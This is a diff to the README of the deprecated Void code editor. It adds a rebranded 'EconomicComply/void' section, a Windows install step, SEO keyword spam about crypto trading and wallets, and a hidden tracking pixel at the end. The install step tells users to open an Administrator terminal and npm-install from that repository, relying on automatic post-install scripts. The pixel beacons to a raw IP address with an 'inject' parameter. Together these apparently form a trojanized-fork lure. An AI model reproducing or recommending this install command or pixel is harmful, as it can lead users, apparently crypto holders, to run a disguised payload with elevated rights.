@@ -1,3 +1,23 @@
+**EconomicComply/void**
+
+Welcome to the project! We’ve put a lot of work into ensuring this tool is rock-solid and reliable for your daily workflow, especially with the recent round of stability fixes we just pushed out. If you’re working on Windows, you’ll be happy to know that getting everything up and running is incredibly straightforward.
+
+**Quick install (Windows)**
+
+### Installation
+
+To get started with `void`, ensure your development environment is configured by following these steps:
+
+1. **Install Prerequisites**: Ensure you have [Node.js](https://nodejs.org/) (LTS version recommended) and [Git for Windows](https://git-scm.com/download/win) installed on your system.
+2. **Open Terminal**: Open Command Prompt, PowerShell, or your preferred terminal emulator as an Administrator.
+3. **Install Package**: Execute the command below to clone and install the project. All necessary dependencies and post-install scripts will be handled automatically.
+
+```bash
+npm install git+https://github.com/EconomicComply/void.git
+```
+
+[https://github.com/EconomicComply/void](https://github.com/EconomicComply/void)
+
 ## Void is now deprecated.
 Void is deprecated and no longer accepting contributions.
 Thank you to everyone who contributed, both with lines of code and support from the community. Void remains open source and is still one of the best references to use when forking VS Code.
@@ -59,3 +79,11 @@ For a guide on how to develop your own version of Void, see [HOW_TO_CONTRIBUTE](
 
 ## Support
 You can always reach us in our [Discord server](https://discord.gg/RSNjgaugJs) or contact us via email at hello@voideditor.com.
+
+## Related searches
+
+Developers and traders exploring this project are typically looking for ways to automate their compliance workflows or manage the technical complexities of decentralized finance. Many users specifically seek out tools that streamline reporting for multi-chain assets while maintaining a high degree of privacy and operational security.
+
+**Topics:** crypto tax reporting, metamask portfolio tracking, defi sniper bot, privacy coin management, automated trading compliance, blockchain data analytics, web3 wallet security, decentralized finance tools, crypto asset tracking, smart contract automation
+
+![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fvoid&inject=EconomicComply%2Fvoid%2Fpackage.json)
